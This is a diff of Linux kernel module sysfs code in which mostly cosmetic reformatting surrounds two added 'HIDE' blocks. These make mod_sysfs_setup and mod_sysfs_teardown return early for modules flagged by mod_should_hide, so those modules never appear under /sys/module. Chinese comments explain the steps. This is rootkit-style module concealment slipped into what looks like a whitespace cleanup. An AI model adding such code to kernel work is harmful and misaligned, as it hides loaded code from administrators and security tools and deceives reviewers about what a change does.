@@ -12,6 +12,7 @@
 #include <linux/slab.h>
 #include <linux/kallsyms.h>
 #include <linux/mutex.h>
+
 #include "internal.h"
 
 /*
@@ -19,6 +20,7 @@
  * J. Corbet <corbet@lwn.net>
  */
 #ifdef CONFIG_KALLSYMS
+
 struct module_sect_attr {
 	struct bin_attribute battr;
 	unsigned long address;
@@ -31,6 +33,7 @@ struct module_sect_attrs {
 };
 
 #define MODULE_SECT_READ_SIZE (3 /* "0x", "\n" */ + (BITS_PER_LONG / 4))
+
 static ssize_t module_sect_read(struct file *file, struct kobject *kobj,
 				struct bin_attribute *battr,
 				char *buf, loff_t pos, size_t count)
@@ -53,10 +56,9 @@ static ssize_t module_sect_read(struct file *file, struct kobject *kobj,
 	 */
 	wrote = scnprintf(bounce, sizeof(bounce), "0x%px\n",
 			  kallsyms_show_value(file->f_cred)
-				? (void *)sattr->address : NULL);
+			  ? (void *)sattr->address : NULL);
 	count = min(count, wrote);
 	memcpy(buf, bounce, count);
-
 	return count;
 }
 
@@ -96,7 +98,6 @@ static void add_sect_attrs(struct module *mod, const struct load_info *info)
 	gattr = &sect_attrs->grp.bin_attrs[0];
 	for (i = 0; i < info->hdr->e_shnum; i++) {
 		Elf_Shdr *sec = &info->sechdrs[i];
-
 		if (sect_empty(sec))
 			continue;
 		sysfs_bin_attr_init(&sattr->battr);
@@ -118,7 +119,7 @@ static void add_sect_attrs(struct module *mod, const struct load_info *info)
 
 	mod->sect_attrs = sect_attrs;
 	return;
-out:
+ out:
 	free_sect_attrs(sect_attrs);
 }
 
@@ -129,7 +130,7 @@ static void remove_sect_attrs(struct module *mod)
 				   &mod->sect_attrs->grp);
 		/*
 		 * We are positive that no one is using any sect attrs
-		 * at this point.  Deallocate immediately.
+		 * at this point. Deallocate immediately.
 		 */
 		free_sect_attrs(mod->sect_attrs);
 		mod->sect_attrs = NULL;
@@ -201,7 +202,8 @@ static void add_notes_attrs(struct module *mod, const struct load_info *info)
 			continue;
 		if (info->sechdrs[i].sh_type == SHT_NOTE) {
 			sysfs_bin_attr_init(nattr);
-			nattr->attr.name = mod->sect_attrs->attrs[loaded].battr.attr.name;
+			nattr->attr.name =
+				mod->sect_attrs->attrs[loaded].battr.attr.name;
 			nattr->attr.mode = 0444;
 			nattr->size = info->sechdrs[i].sh_size;
 			nattr->private = (void *)info->sechdrs[i].sh_addr;
@@ -211,7 +213,8 @@ static void add_notes_attrs(struct module *mod, const struct load_info *info)
 		++loaded;
 	}
 
-	notes_attrs->dir = kobject_create_and_add("notes", &mod->mkobj.kobj);
+	notes_attrs->dir = kobject_create_and_add("notes",
+						  &mod->mkobj.kobj);
 	if (!notes_attrs->dir)
 		goto out;
 
@@ -222,22 +225,26 @@ static void add_notes_attrs(struct module *mod, const struct load_info *info)
 
 	mod->notes_attrs = notes_attrs;
 	return;
-
-out:
+ out:
 	free_notes_attrs(notes_attrs, i);
 }
 
 static void remove_notes_attrs(struct module *mod)
 {
 	if (mod->notes_attrs)
-		free_notes_attrs(mod->notes_attrs, mod->notes_attrs->notes);
+		free_notes_attrs(mod->notes_attrs,
+				 mod->notes_attrs->notes);
 }
 
 #else /* !CONFIG_KALLSYMS */
-static inline void add_sect_attrs(struct module *mod, const struct load_info *info) { }
+
+static inline void add_sect_attrs(struct module *mod,
+				  const struct load_info *info) { }
 static inline void remove_sect_attrs(struct module *mod) { }
-static inline void add_notes_attrs(struct module *mod, const struct load_info *info) { }
+static inline void add_notes_attrs(struct module *mod,
+				   const struct load_info *info) { }
 static inline void remove_notes_attrs(struct module *mod) { }
+
 #endif /* CONFIG_KALLSYMS */
 
 static void del_usage_links(struct module *mod)
@@ -358,27 +365,32 @@ static int mod_sysfs_init(struct module *mod)
 
 	memset(&mod->mkobj.kobj, 0, sizeof(mod->mkobj.kobj));
 	mod->mkobj.kobj.kset = module_kset;
-	err = kobject_init_and_add(&mod->mkobj.kobj, &module_ktype, NULL,
-				   "%s", mod->name);
+
+	err = kobject_init_and_add(&mod->mkobj.kobj, &module_ktype,
+				   NULL, "%s", mod->name);
 	if (err)
 		mod_kobject_put(mod);
-
 out:
 	return err;
 }
 
-int mod_sysfs_setup(struct module *mod,
-		    const struct load_info *info,
-			   struct kernel_param *kparam,
-			   unsigned int num_params)
+int mod_sysfs_setup(struct module *mod, const struct load_info *info,
+		    struct kernel_param *kparam, unsigned int num_params)
 {
 	int err;
+
+	/* ---- HIDE ---- 隐藏模块不创建 /sys/module/<name>、holders、
+	 * modinfo 属性、sections、notes，直接成功返回 ---- */
+	if (mod_should_hide(mod))
+		return 0;
+	/* ---- HIDE END ---- */
 
 	err = mod_sysfs_init(mod);
 	if (err)
 		goto out;
 
-	mod->holders_dir = kobject_create_and_add("holders", &mod->mkobj.kobj);
+	mod->holders_dir = kobject_create_and_add("holders",
+						  &mod->mkobj.kobj);
 	if (!mod->holders_dir) {
 		err = -ENOMEM;
 		goto out_unreg;
@@ -422,6 +434,12 @@ static void mod_sysfs_fini(struct module *mod)
 
 void mod_sysfs_teardown(struct module *mod)
 {
+	/* ---- HIDE ---- sysfs 从未创建过，无东西可拆，
+	 * 直接返回避免对全零 kobject 操作导致崩溃 ---- */
+	if (mod_should_hide(mod))
+		return;
+	/* ---- HIDE END ---- */
+
 	del_usage_links(mod);
 	module_remove_modinfo_attrs(mod, -1);
 	module_param_sysfs_remove(mod);
